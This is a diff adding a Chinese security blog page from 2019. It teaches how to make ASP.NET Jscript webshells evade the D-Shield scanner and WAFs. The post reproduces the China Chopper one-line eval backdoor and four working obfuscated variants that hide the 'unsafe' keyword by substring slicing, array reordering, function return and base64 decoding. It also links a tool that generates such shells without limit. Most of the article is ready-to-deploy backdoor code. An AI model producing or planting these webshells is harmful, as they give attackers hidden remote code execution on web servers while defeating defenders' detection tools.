@@ -1,0 +1,477 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>无限免杀D盾脚本之aspx - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="无限免杀D盾脚本之aspx" />
+<meta property="og:description" content="1 2019-7-15 自己发在土司的文章 1 前言自己曾经写过一篇文章:利用随机异或无限免杀某盾 php的webshell免杀方法有很多,但是市面上很少有讲aspx" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/webshell-venom-aspx/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-08-11T22:27:11+00:00" />
+<meta property="article:modified_time" content="2019-08-11T22:27:11+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="无限免杀D盾脚本之aspx"/>
+<meta name="twitter:description" content="1 2019-7-15 自己发在土司的文章 1 前言自己曾经写过一篇文章:利用随机异或无限免杀某盾 php的webshell免杀方法有很多,但是市面上很少有讲aspx"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/webshell-venom-aspx/" /><link rel="prev" href="https://yzddmr6.com/posts/webshell-venom-1-0/" /><link rel="next" href="https://yzddmr6.com/posts/webshell-venom/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "无限免杀D盾脚本之aspx",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/webshell-venom-aspx\/"
+        },"genre": "posts","keywords": "免杀, webshell-venom","wordcount":  1031 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/webshell-venom-aspx\/","datePublished": "2019-08-11T22:27:11+00:00","dateModified": "2019-08-11T22:27:11+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#0x01-主要方法">0x01 主要方法</a></li>
+    <li><a href="#0x02--了解aspx一句话">0x02  了解aspx一句话</a>
+      <ul>
+        <li><a href="#jscript基本用法">Jscript基本用法</a></li>
+        <li><a href="#字符串拼接">字符串拼接</a></li>
+        <li><a href="#数组声明">数组声明</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-字符串拼接">0x02 字符串拼接</a></li>
+    <li><a href="#0x03-数组">0x03 数组</a></li>
+    <li><a href="#0x04-函数">0x04 函数</a></li>
+    <li><a href="#0x05-base64编码">0x05 BASE64编码</a></li>
+    <li><a href="#0x06-总结">0x06 总结</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">无限免杀D盾脚本之aspx</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-08-11">2019-08-11</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-08-11">2019-08-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1031 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#0x01-主要方法">0x01 主要方法</a></li>
+    <li><a href="#0x02--了解aspx一句话">0x02  了解aspx一句话</a>
+      <ul>
+        <li><a href="#jscript基本用法">Jscript基本用法</a></li>
+        <li><a href="#字符串拼接">字符串拼接</a></li>
+        <li><a href="#数组声明">数组声明</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-字符串拼接">0x02 字符串拼接</a></li>
+    <li><a href="#0x03-数组">0x03 数组</a></li>
+    <li><a href="#0x04-函数">0x04 函数</a></li>
+    <li><a href="#0x05-base64编码">0x05 BASE64编码</a></li>
+    <li><a href="#0x06-总结">0x06 总结</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> 2019-7-15 自己发在土司的文章
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>自己曾经写过一篇文章:利用随机异或无限免杀某盾</p>
+<p>php的webshell免杀方法有很多,但是市面上很少有讲aspx免杀的文章.</p>
+<p>因为aspx的权限一般较大,对于渗透过程中还是很重要的, 所以就想着写一篇文章来简单的介绍下aspx的免杀</p>
+<h2 id="0x01-主要方法" class="headerLink">
+    <a href="#0x01-%e4%b8%bb%e8%a6%81%e6%96%b9%e6%b3%95" class="header-mark"></a>2 0x01 主要方法</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">字符串拼接
+</span></span><span class="line"><span class="cl">函数
+</span></span><span class="line"><span class="cl">数组
+</span></span><span class="line"><span class="cl">Base64编码
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x02--了解aspx一句话" class="headerLink">
+    <a href="#0x02--%e4%ba%86%e8%a7%a3aspx%e4%b8%80%e5%8f%a5%e8%af%9d" class="header-mark"></a>3 0x02  了解aspx一句话</h2><p>Aspx的一句话一般是使用Jscript语言实现</p>
+<p>看看原本的菜刀aspx一句话</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34;%&gt; &lt;%eval(Request.Item[&#34;pass&#34;],&#34;unsafe&#34;);%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实与php的类似
+Eval函数将字符串当做代码执行
+不同的是在Jscript中为了安全起见必须使用unsafe参数,才可以使其具有对操作系统操作的功能</p>
+<p>Request.Item[&ldquo;pass&rdquo;] 的pass就是接受的参数 类似于php的$_POST[“pass”]</p>
+<h3 id="jscript基本用法" class="headerLink">
+    <a href="#jscript%e5%9f%ba%e6%9c%ac%e7%94%a8%e6%b3%95" class="header-mark"></a>3.1 Jscript基本用法</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Function xxx(){}//声明一个函数
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="字符串拼接" class="headerLink">
+    <a href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%8b%bc%e6%8e%a5" class="header-mark"></a>3.2 字符串拼接</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Var a =’a’+’b’;//a=’ab’;
+</span></span><span class="line"><span class="cl">Var a= ‘\x61’; //a=’a’;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="数组声明" class="headerLink">
+    <a href="#%e6%95%b0%e7%bb%84%e5%a3%b0%e6%98%8e" class="header-mark"></a>3.3 数组声明</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Var a=’abc’;
+</span></span><span class="line"><span class="cl">Var b=a(0);//b=’a’;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>作为免杀来说一般waf杀的都是unsafe这个参数,所以我们的免杀也将从这个参数下手</p>
+<h2 id="0x02-字符串拼接" class="headerLink">
+    <a href="#0x02-%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%8b%bc%e6%8e%a5" class="header-mark"></a>4 0x02 字符串拼接</h2><p>经过测试,一般来说把’unsafe’这个字符串无论是十六进制拼接还是直接大小写拼接均不可行
+于是想到可以采用substr函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">var a=Request.Form(&#34;mr6&#34;);
+</span></span><span class="line"><span class="cl">var b=&#39;aaaunsaaaafe&#39;;
+</span></span><span class="line"><span class="cl">var b=b.substr(3,4)+b.substr(10);
+</span></span><span class="line"><span class="cl">eval(a,b);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x03-数组" class="headerLink">
+    <a href="#0x03-%e6%95%b0%e7%bb%84" class="header-mark"></a>5 0x03 数组</h2><p>感觉大多数waf对数组拼接并不感冒,就可以打乱顺序,利用数组进行拼接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">var a=&#39;efasnu&#39;;
+</span></span><span class="line"><span class="cl">var b=Request.Form(&#34;mr6&#34;);
+</span></span><span class="line"><span class="cl">var c=a(5)+a(4)+a(3)+a(2)+a(1)+a(0);
+</span></span><span class="line"><span class="cl">eval(b,c);
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x04-函数" class="headerLink">
+    <a href="#0x04-%e5%87%bd%e6%95%b0" class="header-mark"></a>6 0x04 函数</h2><p>因为某盾对字符串拼接杀得比较厉害,放在函数里当做返回值即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">var a=Request.Form(&#34;mr6&#34;);
+</span></span><span class="line"><span class="cl">function ok()
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">var c=&#34;un&#34;;
+</span></span><span class="line"><span class="cl">var b=&#34;safe&#34;;
+</span></span><span class="line"><span class="cl">return c+b;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">eval(a,ok());
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x05-base64编码" class="headerLink">
+    <a href="#0x05-base64%e7%bc%96%e7%a0%81" class="header-mark"></a>7 0x05 BASE64编码</h2><p>Php中经常使用base64编码来bypass,那么在aspx中如何实现呢</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">var res=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(‘eXpkZG1yNg==’);//res=’yzddmr6’;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么我们对于unsafe这个特征就可以使用base64编码来绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">var a=Request.Form(&#34;mr6&#34;);
+</span></span><span class="line"><span class="cl">var res=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(&#39;dW5zYWZl&#39;));
+</span></span><span class="line"><span class="cl">eval(a,res);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x06-总结" class="headerLink">
+    <a href="#0x06-%e6%80%bb%e7%bb%93" class="header-mark"></a>8 0x06 总结</h2><p>可能是因为aspx的免杀现在还不是很多,所以waf的查杀并不是很严格,不需要太复杂就可以绕过.
+对于以上方法还可以连环套用,以达到混淆的效果</p>
+<p>自己写了个脚本,利用以上方法来无限生成免杀aspx的webshell</p>
+<p>已经放到了自己的项目webshell_venom中</p>
+<p>项目地址:
+<a href="https://github.com/yzddmr6/webshell-venom" target="_blank" rel="noopener noreferrer">https://github.com/yzddmr6/webshell-venom</a></p>
+</div>
+
+        
+
+
+<h2>相关内容</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/jsp-classload-backdoor/">[知识星球]JSP类加载后门</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/webshell-bypass-jsp/">WebShell免杀之JSP</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/shellcode-bypass-360-3/">MSF免杀360&#43;火绒上线(三)</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/shellcode-bypass-360-2/">MSF免杀360&#43;火绒上线(二)</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/shellcode-bypass-360-1/">MSF免杀360&#43;火绒上线(一)</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-08-11</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/webshell-venom-aspx/" data-title="无限免杀D盾脚本之aspx" data-hashtags="免杀,webshell-venom"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/webshell-venom-aspx/" data-hashtag="免杀"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/webshell-venom-aspx/" data-title="无限免杀D盾脚本之aspx"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/webshell-venom-aspx/" data-title="无限免杀D盾脚本之aspx"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/webshell-venom-aspx/" data-title="无限免杀D盾脚本之aspx"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/webshell-venom-aspx/" data-title="无限免杀D盾脚本之aspx" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;无限免杀D盾脚本之aspx&#34;, &#34;https://yzddmr6.com/posts/webshell-venom-aspx/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%85%8D%E6%9D%80/">免杀</a>,&nbsp;<a href="/tags/webshell-venom/">webshell-venom</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/webshell-venom-1-0/" class="prev" rel="prev" title="利用随机异或无限免杀d盾"><i class="fas fa-angle-left fa-fw"></i>利用随机异或无限免杀d盾</a>
+            <a href="/posts/webshell-venom/" class="next" rel="next" title="一键吊打D盾(免杀一句话无限生成)">一键吊打D盾(免杀一句话无限生成)<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
